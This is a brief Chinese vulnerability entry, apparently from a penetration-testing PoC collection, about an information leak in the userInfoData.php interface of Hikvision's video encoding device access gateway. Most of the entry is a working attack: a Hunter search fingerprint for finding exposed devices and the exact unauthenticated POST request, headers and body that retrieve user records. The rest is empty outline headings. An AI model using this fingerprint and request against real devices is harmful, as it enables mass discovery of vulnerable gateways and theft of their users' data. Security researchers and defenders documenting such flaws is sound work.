# 海康威视视频编码设备接入网关userinfodata接口存在信息泄漏漏洞

- **系统**：海康　|　**类型**：信息泄露　|　**CVE**：—
- **指纹**：`hunter：`web.title="视频编码设备接入网关"&&app.name=="Hikvision 海康威视视频编码设备接入网关"``
- **请求**：`POST /data/userInfoData.php HTTP/1.1`
- **关键头**：`Content-Length: 38`　`X-Requested-With: XMLHttpRequest`　`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
page=1&rows=20&sort=userId&order=asc

\[hikvision-spbmjrwg-userinfodate-info.yaml]\(公众号：渗透安全HackTwo>
```

**其他**
- 海康威视视频编码设备接入网关userinfodata接口存在信息泄漏漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * HIKVISION 视频编码设备接入网关